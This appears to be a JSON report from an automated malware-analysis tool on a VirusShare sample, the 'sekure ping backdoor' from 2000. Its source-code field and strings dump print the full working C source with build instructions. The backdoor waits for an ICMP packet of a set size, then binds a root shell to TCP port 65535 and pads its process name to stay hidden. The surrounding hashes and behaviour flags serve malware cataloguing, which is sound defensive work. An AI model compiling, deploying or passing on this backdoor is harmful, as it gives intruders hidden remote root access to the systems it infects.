{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "execl": "May run an executable file or a system command on a Mac",
            "shell": "May run an executable file or a system command"
        },
        "macro": "/*\n* sekure ping backdoor for linux.solaris (2000)\n*\n*\n* usage:\n* for linux:cc -o icmp icmp.c\n* ping -s port targetip\n* for solaris:gcc -o icmp icmp.c -lrpcsvc -lnsl -lsocket\n* ping -s targetip port\n*\n* coded by jamez. e-mail: jamez@sekure.org\n*\n* http://www.sekure.org\n*    code by jamez\n*    edit by redzl\n*/\n#include <signal.h>\n#include <netinet/in.h>\n#include <netdb.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdio.h>\n#define SIZEPACK 77\n#define PORT     65535\n \nvoid child_kill()\n{\n  wait(NULL);\n  signal(SIGCHLD, child_kill);\n}\nint bind_shell()\n{\n  int soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid;\n  struct sockaddr_in serv_addr;\n  struct sockaddr_in client_addr;\n  setuid(0);\n  setgid(0);\n  seteuid(0);\n  setegid(0);\n  chdir(\"/\");\n  soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n  if (soc_des == -1)\n    exit(-1);\n  bzero((char *) &serv_addr,sizeof(serv_addr));\n  serv_addr.sin_family = AF_INET;\n  serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);\n  serv_addr.sin_port = htons(PORT);\n  soc_rc = bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));\n \n  if (soc_rc != 0)\n    exit(-1);\n  if (fork() != 0)\n    exit(0);\n  setpgrp();\n  if (fork() != 0)\n    exit(0);\n  soc_rc = listen(soc_des, 5);\n  if (soc_rc != 0)\n    exit(0);\n  while (1)\n    {\n      soc_len = sizeof(client_addr);\n      soc_cli = accept(soc_des, (struct sockaddr *) &client_addr, &soc_len);\n \n      if (soc_cli < 0)\n        exit(0);\n      cli_pid = getpid();\n      server_pid = fork();\n      if (server_pid != 0)\n        {\n          dup2(soc_cli,0);\n          dup2(soc_cli,1);\n          dup2(soc_cli,2);\n          execl(\"/bin/sh\",\"sh\",(char *)0);\n          close(soc_cli);\n          return 1;\n        }\n      close(soc_cli);\n    }\n}\nint main(int argc, char *argv[])\n{\n  int s, size, fromlen;\n  char pkt[4096];\n  struct protoent *proto;\n  struct sockaddr_in from;\n \n  strcpy(argv[0], (char *)strcat(argv[0], \"                             \"));\n \n  signal(SIGHUP,SIG_IGN);\n  signal(SIGCHLD, child_kill);\n  if (fork() != 0) exit(0);\n  proto = getprotobyname(\"icmp\");\n  if ((s = socket(AF_INET, SOCK_RAW, proto->p_proto)) < 0)\n    /* can't creat raw socket */\n    exit(0);\n \n  /* waiting for packets */\n  while(1)\n    {\n      do\n        {\n          fromlen = sizeof(from);\n          if ((size = recvfrom(s, pkt, sizeof(pkt), 0, (struct sockaddr *) &from\n, &\nfromlen)) < 0)\n            printf(\"\", size-28);\n \n        } while (size != SIZEPACK + 28);\n      /* size == SIZEPACK, let's bind the shell */\n      switch(fork())      {\n      case -1:\n        continue;\n      case 0:\n        /* strcpy(argv[0], \"-sekure working for your profit-\"); */\n        bind_shell();\n        exit(0);\n      }\n      sleep(15);\n    }\n}\n "
    },
    "filename": "VirusShare_1a38ffc92d20f37563285e1b86f80fa7",
    "filesize": 2728,
    "filetype": "C source, ASCII text",
    "hashes": {
        "md5": "1a38ffc92d20f37563285e1b86f80fa7",
        "sha1": "362a1a3205a6698ac75cc53e8c88222f186d11a6",
        "sha256": "d1230404e64f907d95a782bb7e8c9786588d8643f0645c2c1feb758bb78ad6dc"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "* sekure ping backdoor for linux.solaris (2000)",
            "* usage:",
            "* for linux:cc -o icmp icmp.c",
            "* ping -s port targetip",
            "* for solaris:gcc -o icmp icmp.c -lrpcsvc -lnsl -lsocket",
            "* ping -s targetip port",
            "* coded by jamez. e-mail: jamez@sekure.org",
            "* http://www.sekure.org",
            "*    code by jamez",
            "*    edit by redzl",
            "#include <signal.h>",
            "#include <netinet/in.h>",
            "#include <netdb.h>",
            "#include <sys/socket.h>",
            "#include <sys/types.h>",
            "#include <stdio.h>",
            "#define SIZEPACK 77",
            "#define PORT     65535",
            "void child_kill()",
            "  wait(NULL);",
            "  signal(SIGCHLD, child_kill);",
            "int bind_shell()",
            "  int soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid;",
            "  struct sockaddr_in serv_addr;",
            "  struct sockaddr_in client_addr;",
            "  setuid(0);",
            "  setgid(0);",
            "  seteuid(0);",
            "  setegid(0);",
            "  chdir(\"/\");",
            "  soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);",
            "  if (soc_des == -1)",
            "    exit(-1);",
            "  bzero((char *) &serv_addr,sizeof(serv_addr));",
            "  serv_addr.sin_family = AF_INET;",
            "  serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);",
            "  serv_addr.sin_port = htons(PORT);",
            "  soc_rc = bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));",
            "  if (soc_rc != 0)",
            "    exit(-1);",
            "  if (fork() != 0)",
            "    exit(0);",
            "  setpgrp();",
            "  if (fork() != 0)",
            "    exit(0);",
            "  soc_rc = listen(soc_des, 5);",
            "  if (soc_rc != 0)",
            "    exit(0);",
            "  while (1)",
            "    {",
            "      soc_len = sizeof(client_addr);",
            "      soc_cli = accept(soc_des, (struct sockaddr *) &client_addr, &soc_len);",
            "      if (soc_cli < 0)",
            "        exit(0);",
            "      cli_pid = getpid();",
            "      server_pid = fork();",
            "      if (server_pid != 0)",
            "        {",
            "          dup2(soc_cli,0);",
            "          dup2(soc_cli,1);",
            "          dup2(soc_cli,2);",
            "          execl(\"/bin/sh\",\"sh\",(char *)0);",
            "          close(soc_cli);",
            "          return 1;",
            "        }",
            "      close(soc_cli);",
            "    }",
            "int main(int argc, char *argv[])",
            "  int s, size, fromlen;",
            "  char pkt[4096];",
            "  struct protoent *proto;",
            "  struct sockaddr_in from;",
            "  strcpy(argv[0], (char *)strcat(argv[0], \"                             \"));",
            "  signal(SIGHUP,SIG_IGN);",
            "  signal(SIGCHLD, child_kill);",
            "  if (fork() != 0) exit(0);",
            "  proto = getprotobyname(\"icmp\");",
            "  if ((s = socket(AF_INET, SOCK_RAW, proto->p_proto)) < 0)",
            "    /* can't creat raw socket */",
            "    exit(0);",
            "  /* waiting for packets */",
            "  while(1)",
            "    {",
            "      do",
            "        {",
            "          fromlen = sizeof(from);",
            "          if ((size = recvfrom(s, pkt, sizeof(pkt), 0, (struct sockaddr *) &from",
            "fromlen)) < 0)",
            "            printf(\"\", size-28);",
            "        } while (size != SIZEPACK + 28);",
            "      /* size == SIZEPACK, let's bind the shell */",
            "      switch(fork())      {",
            "      case -1:",
            "        continue;",
            "      case 0:",
            "        /* strcpy(argv[0], \"-sekure working for your profit-\"); */",
            "        bind_shell();",
            "        exit(0);",
            "      }",
            "      sleep(15);",
            "    }"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.sekure.org"
        ]
    },
    "time": "0:00:00.264038",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
